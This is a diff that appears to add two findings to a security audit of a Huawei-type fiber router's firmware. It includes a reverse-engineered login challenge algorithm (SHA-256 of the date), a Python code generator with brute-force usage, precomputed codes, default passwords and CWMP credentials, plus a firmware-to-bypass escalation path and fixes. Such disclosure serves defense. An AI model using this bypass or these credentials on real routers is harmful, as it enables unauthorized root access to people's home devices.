@@ -2383,3 +2383,166 @@ attributes or even new cookies can be injected.
 24. **Lock CfgMode at provisioning time** — prevent ISP mode switching after initial deployment
 25. **Store CSRF token in JavaScript closure, not DOM** — prevent XSS-to-CSRF escalation via `onttoken`
 26. **Sanitize all form inputs** — validate and encode `getValue()` results before `addParameter()`
+
+---
+
+## V-33: Challenge Code Algorithm Reversed from Firmware (CRITICAL)
+
+**Severity**: CRITICAL  
+**Source**: Firmware binary analysis of V500R022C00SPC340B019  
+**Binary sources**:
+- `lib/libhw_smp_web_base.so` → `HW_WEB_GetSHAByTime` at offset 0x12c44
+- `lib/libhw_web_dll.so` → `WEB_CHALLENGE_*` functions (source: `web_challenge.c`)
+- `lib/libhw_ssp_basic.so` → `HW_SHA256_CAL` at offset 0x88920
+- `bin/clid` → `CLI_CheckChallengeAuthForMag`, `HW_CLI_VerifySuPassword`
+
+### Description
+
+The challenge verification code algorithm has been fully reverse-engineered from
+the firmware binaries. The router uses **SHA-256(YYYYMMDD)** as the challenge
+code for the web login when `FT_SSMP_PWD_CHALLENGE` is enabled.
+
+### Web Challenge Algorithm
+
+When `useChallengeCode='1'` (MEGACABLE2 mode), the login page displays:
+```javascript
+var randcode = '20260221';  // WEB_GetChallengeRandCode() → YYYYMMDD
+```
+
+The server-side flow:
+1. `WEB_CHALLENGE_GetLocalTime()` formats the router date as `%4u%02u%02u`
+   (year, month+1, day) → `YYYYMMDD`
+2. `HW_WEB_GetSHAByTime(date_uint32, output, size)`:
+   - `HW_OS_UInt32ToStr_S(date, buf, 17)` → converts integer to string
+   - `HW_SHA256_CAL(buf, sha_buf)` → SHA-256 hash
+   - `strncpy_s(output, size, sha_buf, min(size, 65)-1)` → copies hex digest
+3. `WEB_CHALLENGE_CheckVerifyCodeResult(user_input)`:
+   - `HW_OS_MemCmp(stored_challenge, user_input, 0x11)` → compares 16 hex chars
+
+**Algorithm: `verification_code = SHA256(YYYYMMDD)[:16]`**
+
+### CLI/Telnet Challenge Algorithm
+
+When `FT_SSMP_CLI_SU_CHALLENGE` is enabled (disabled by default), the `su`
+command shows:
+```
+Date:19810101
+Challenge:ENCRYPTED_HEX
+Please input verification code:
+```
+
+The CLI flow:
+1. `CLI_AES_GeKey()` → retrieves AES-256 key from XML config database
+   (parameter 0x0B via `HW_XML_DBGetSiglePara`)
+2. `CLI_AES_GetRandomStr(nonce, 9)` + `CLI_AES_GetRandomStr(iv, 17)` →
+   generates random nonce and IV
+3. `CLI_AES_Encrypt(nonce, iv, key, &encrypted, &enc_len)` → AES-CBC
+4. Display encrypted result as `Challenge:` value
+5. User must provide correct decryption response
+
+### Root Telnet Login (Date:19810101)
+
+The `Date:19810101` prompt indicates the router's RTC has no NTP sync
+(factory default = January 1, 1981). The password depends on the enabled
+feature flags:
+
+| Feature Flag | Password | Source |
+|---|---|---|
+| `FT_SSMP_PWD_CHALLENGE=1` | `SHA256("19810101")[:16]` = `364ce967beff355b` | `HW_WEB_GetSHAByTime` |
+| `FT_SSMP_CLI_SU_CHALLENGE=1` | AES-encrypted challenge (requires DB key) | `CLI_AES_GetAuthInfo` |
+| Both disabled (default) | `admin`, `adminHW`, or device serial number | Standard busybox login |
+
+### Feature Flag Defaults (from `base_smart_ft.cfg`)
+
+```
+feature.name="FT_SSMP_CLI_SU_CHALLENGE" feature.enable="0"
+feature.name="FT_SSMP_PWD_CHALLENGE"    (ISP-dependent, MEGACABLE2=1)
+feature.name="FT_TELNET_DENY"           feature.enable="1"
+```
+
+### PoC — Challenge Code Generator
+
+```bash
+# Generate for factory date
+python tools/challenge_generator.py --date 19810101
+
+# Fetch from live router and generate
+python tools/challenge_generator.py --target 192.168.100.1
+
+# Brute-force date range
+python tools/challenge_generator.py --brute --start 20240101 --end 20260301
+```
+
+```python
+import hashlib
+
+def generate_challenge(date_str: str) -> str:
+    """Generate the verification code for a given date (YYYYMMDD)."""
+    return hashlib.sha256(date_str.encode()).hexdigest()[:16]
+
+# Factory date
+print(generate_challenge("19810101"))  # 364ce967beff355b
+
+# Today's date (as shown on router)
+print(generate_challenge("20260221"))  # 96eb2f1c1ff60cc5
+```
+
+### Impact
+
+- Any user who can see the login page can compute the verification code
+- The `randcode` (date) is embedded in the HTML source code
+- SHA-256 of a known date is trivially computable
+- The CLI AES challenge requires the router's stored key, but if
+  `FT_SSMP_CLI_SU_CHALLENGE` is disabled (default), standard passwords apply
+
+---
+
+## V-34: Firmware Exposes System Architecture and Credentials (HIGH)
+
+**Severity**: HIGH  
+**Source**: Firmware binary extraction (squashfs at offset 0x28AE49)
+
+### Description
+
+The firmware squashfs filesystem contains sensitive system information:
+
+1. **Processor**: ARM 32-bit (`ELF 32-bit LSB`, `ld-musl-arm.so.1`)
+2. **Login shell**: `WAP(Dopra Linux) #` (from `/etc/profile`)
+3. **Root access**: `LOGNAME=root`, all `pts/0-32` allowed in `/etc/securetty`
+4. **Config encryption**: AES-encrypted XML config (`hw_ctree.xml`)
+5. **Key management**: `KMC_GenerateCyperKeyByStr`, `KsfCheckKeyStore`,
+   `MemSetRootKeyCfg` in `libhw_ssp_basic.so`
+6. **CWMP credentials** in config: `AdminGPON`, `ONTconnect` (if decrypted)
+7. **SSH/Telnet**: `dropbear` binary with `plink -ssh -P %u root@%s` command
+8. **Equipment mode**: `huaweiequiptestmode-on/off` (enables factory testing)
+
+### Sensitive Paths in Firmware
+
+| Path | Content |
+|---|---|
+| `/etc/securetty` | All pts/0-32 allowed for root |
+| `/etc/profile` | Root shell prompt, env vars |
+| `/etc/login.defs` | SHA-512 password encryption |
+| `/etc/wap/hw_ctree.xml` | AES-encrypted config database |
+| `/etc/wap/ft/smart/base_smart_ft.cfg` | Feature flag defaults |
+| `/bin/clid` | CLI daemon with challenge auth |
+| `/bin/dropbear` | SSH server binary |
+| `/lib/libhw_web_dll.so` | Web auth library |
+| `/lib/libhw_smp_web_base.so` | Challenge code generation |
+| `/lib/libhw_ssp_basic.so` | Crypto primitives (AES, SHA, PBKDF2) |
+
+### Escalation Path 19: Firmware Analysis → Challenge Bypass
+
+1. Download firmware from update server or extract from device
+2. Extract squashfs filesystem (offset 2666057)
+3. Reverse-engineer `HW_WEB_GetSHAByTime` algorithm
+4. Generate challenge codes for any date
+5. Use generated code to pass web/CLI challenge verification
+
+### Recommendations
+
+27. **Use HMAC with device-specific key instead of SHA-256(date)** — the current
+    algorithm is deterministic and trivially reproducible
+28. **Do not expose date as `randcode` in HTML** — use a server-generated nonce
+29. **Enable `FT_SSMP_CLI_SU_CHALLENGE` with unique per-device AES keys** —
+    the default disabled state falls back to static passwords
